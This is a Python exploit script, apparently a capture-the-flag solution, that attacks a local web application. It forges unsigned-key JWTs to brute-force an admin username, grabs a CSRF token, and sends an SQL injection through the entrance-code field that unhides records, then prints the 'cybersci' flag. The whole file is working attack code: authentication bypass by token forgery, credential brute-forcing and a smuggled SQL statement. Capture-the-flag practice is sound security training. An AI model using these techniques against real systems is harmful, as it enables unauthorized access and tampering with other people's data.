import jwt
import random
import re
import requests

# disable InsecureRequestWarning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = 'https://localhost'

# create session for storing request settings
session = requests.Session()
session.verify = False

# spoof user agent
session.headers['User-Agent'] = 'Chrome/1.0'

# bruteforce username
admin_username = None

for i in range(1000, 2000):
    if i % 100 == 0:
        print(f'Trying usernames admin{i} - admin{i + 99}')
    
    # craft username and token
    username = 'admin' + str(i)
    token = jwt.encode({
        'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier': username
    }, key='this_doesnt_matter', algorithm='HS256')

    # add token to cookies
    session.cookies['token'] = token

    # access dashboard
    response = session.get(base_url + '/Dashboard', allow_redirects=False)
    
    # unauthorized, try next username
    if response.status_code != 200:
        continue
    
    # success, found username
    print('Found username:', username)
    admin_username = username
    break
else:
    print('Failed to find username')
    exit()

# craft jwt
token = jwt.encode({
    'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier': admin_username
}, key='this_doesnt_matter', algorithm='HS256')

# add token to cookies
session.cookies['token'] = token

# verify access to dashboard
response = session.get(base_url + '/Dashboard', allow_redirects=False)
assert response.status_code == 200

# Get CSRF token
CSRF_PATTERN = '__RequestVerificationToken.*value="([^"]+)"'
response = session.get(base_url + '/Dashboard')
csrf_token = re.search(CSRF_PATTERN, response.text).group(1)

# Add attendee (sqli)
print('Running SQLi...')

"""
Regular backend query:
INSERT INTO Attendees (AttendeeName, AttendeeEntranceCode, RallyId) VALUES ('test2222', 'test2222', 1)

Malicious backend query:
INSERT INTO "Attendees" ("AttendeeName", "AttendeeEntranceCode", "RallyId") VALUES ('test2222', '', 1); UPDATE "Rallies" SET "Hidden" = FALSE; --', 1)
"""

entrance_code = f"""
{random.randint(1000000, 9999999)}', 1); UPDATE "Rallies" SET "Hidden" = FALSE; --
""".strip()

response = session.post(base_url + '/Dashboard', data={
    'AttendeeName': 'Random name',
    'AttendeeEntranceCode': entrance_code,
    'RallyId': 1,
    '__RequestVerificationToken': csrf_token
})

FLAG_PATTERN = 'cybersci{.*}'
flag = re.search(FLAG_PATTERN, response.text).group(0)

print('Flag:', flag)